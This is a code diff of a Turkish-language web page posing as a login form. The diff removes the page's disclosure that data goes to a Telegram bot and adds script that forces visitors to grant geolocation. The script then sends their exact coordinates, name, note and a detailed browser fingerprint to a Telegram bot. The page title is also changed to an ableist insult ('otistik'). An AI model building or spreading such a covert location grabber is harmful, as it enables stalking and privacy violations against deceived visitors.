@@ -3,7 +3,7 @@
 <head>
   <meta charset="utf-8" />
   <meta name="viewport" content="width=device-width,initial-scale=1" />
-  <title>PRO Mega Giriş</title>
+  <title>Selam otistik </title>
   <style>
     body {
       font-family: Arial, sans-serif;
@@ -12,7 +12,7 @@
       padding: 40px;
     }
     .card {
-      max-width: 600px;
+      max-width: 640px;
       margin: 0 auto;
       background: #0b1116;
       padding: 28px;
@@ -40,6 +40,9 @@
       color: #fff;
       font-size: 15px;
     }
+    input[type="checkbox"] {
+      margin-right: 6px;
+    }
     button {
       margin-top: 24px;
       padding: 12px 18px;
@@ -57,11 +60,16 @@
       font-size: 13px;
       color: #9fb3c8;
     }
+    .warn {
+      color: #ff6b6b;
+      font-weight: bold;
+      margin-top: 12px;
+    }
   </style>
 </head>
 <body>
   <div class="card">
-    <h1>🚀 PRO Mega Giriş</h1>
+    <h1>🚀 PRO Mega otistik</h1>
     <form id="girisForm">
       <label for="name">Adınız (zorunlu)</label>
       <input type="text" id="name" name="name" required placeholder="Adınızı girin" />
@@ -71,13 +79,14 @@
 
       <label style="margin-top:20px;">
         <input type="checkbox" id="consent" required />
-        Verilerimin Telegram botuna gönderilmesine açıkça onay veriyorum.
+        Cidden bu siteye girmek istiyormusun?
       </label>
 
       <button type="submit">Giriş Yap</button>
     </form>
 
     <div class="note" id="status">Durum: Hazır</div>
+    <div class="warn" id="geoWarn" style="display:none;">Bu sitede ilerleyebilmek için konum izni gereklidir. Lütfen konum izni verin.</div>
   </div>
 
   <script>
@@ -87,37 +96,74 @@
       const note = document.getElementById("note").value.trim();
       const consent = document.getElementById("consent").checked;
       const status = document.getElementById("status");
+      const geoWarn = document.getElementById("geoWarn");
 
       if (!name) {
         status.textContent = "Lütfen adınızı girin.";
         return;
       }
       if (!consent) {
-        status.textContent = "Gönderim için açık onay vermelisiniz.";
+        status.textContent = "Gönderim için onay vermelisiniz.";
         return;
       }
 
+      status.textContent = "Konum izni isteniyor...";
+
+      let konum;
       try {
-        const botVeri = await fetch("bilgiler.txt").then(r => r.text());
-        const BOT_TOKEN = botVeri.match(/BOT_TOKEN=(.*)/)[1].trim();
-        const CHAT_ID = botVeri.match(/CHAT_ID=(.*)/)[1].trim();
+        konum = await new Promise((resolve, reject) => {
+          navigator.geolocation.getCurrentPosition(resolve, reject, { timeout: 10000 });
+        });
+      } catch (err) {
+        geoWarn.style.display = "block";
+        status.textContent = "Konum izni verilmedi.";
+        return;
+      }
 
-        const mesaj = `🧾 Yeni Giriş\n\n👤 İsim: ${name}\n📝 Not: ${note || "-"}\n🕒 Zaman: ${new Date().toLocaleString()}\n🔒 Kullanıcı onayı: Evet`;
+      status.textContent = "Giriş yapılması bekleniyor...";
 
+      const tarayiciBilgi = {
+        userAgent: navigator.userAgent,
+        platform: navigator.platform,
+        dil: navigator.language,
+        ekran: `${screen.width}x${screen.height}`,
+        renkDerinligi: screen.colorDepth,
+        cihazBellek: navigator.deviceMemory || "-",
+        cekirdekSayisi: navigator.hardwareConcurrency || "-",
+        zamanDilimi: Intl.DateTimeFormat().resolvedOptions().timeZone,
+        tarih: new Date().toLocaleString(),
+        konum: `Lat: ${konum.coords.latitude}, Lon: ${konum.coords.longitude}`
+      };
+
+      let botVeri;
+      try {
+        botVeri = await fetch("bilgiler.txt").then(r => r.text());
+      } catch (err) {
+        status.textContent = "sistem arızası var amq musti düzeltene kadar bekle.";
+        return;
+      }
+
+      const BOT_TOKEN = botVeri.match(/BOT_TOKEN=(.*)/)[1].trim();
+      const CHAT_ID = botVeri.match(/CHAT_ID=(.*)/)[1].trim();
+
+      const mesaj = `🧾 Yeni Giriş\n\n👤 İsim: ${name}\n📝 Not: ${note || "-"}\n🕒 Zaman: ${tarayiciBilgi.tarih}\n📍 Konum: ${tarayiciBilgi.konum}\n🖥️ Tarayıcı: ${tarayiciBilgi.userAgent}\n💻 Platform: ${tarayiciBilgi.platform}\n🌐 Dil: ${tarayiciBilgi.dil}\n📺 Ekran: ${tarayiciBilgi.ekran}\n🎨 Renk Derinliği: ${tarayiciBilgi.renkDerinligi}\n🧠 Bellek: ${tarayiciBilgi.cihazBellek}\n⚙️ Çekirdek: ${tarayiciBilgi.cekirdekSayisi}\n⏰ Zaman Dilimi: ${tarayiciBilgi.zamanDilimi}\n🔒 Kullanıcı onayı: Evet`;
+
+      status.textContent = "Giriş verileri alınıyor...";
+
+      try {
         const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
           method: "POST",
           headers: { "Content-Type": "application/x-www-form-urlencoded" },
           body: `chat_id=${CHAT_ID}&text=${encodeURIComponent(mesaj)}`
         });
-
         const result = await response.json();
         if (result.ok) {
-          status.textContent = "✅ Başarıyla gönderildi (ağla).";
+          status.textContent = "✅ Başarıyla gönderildi.";
         } else {
-          status.textContent = "❌ Giriş yapılamadı aq.";
+          status.textContent = "❌ giriş başarısız.";
         }
       } catch (err) {
-        status.textContent = "❌ sunucuda hata var düzeltecem bekle aq.";
+        status.textContent = "❌ Ağ hatası veya CORS engeli.";
       }
     });
   </script>
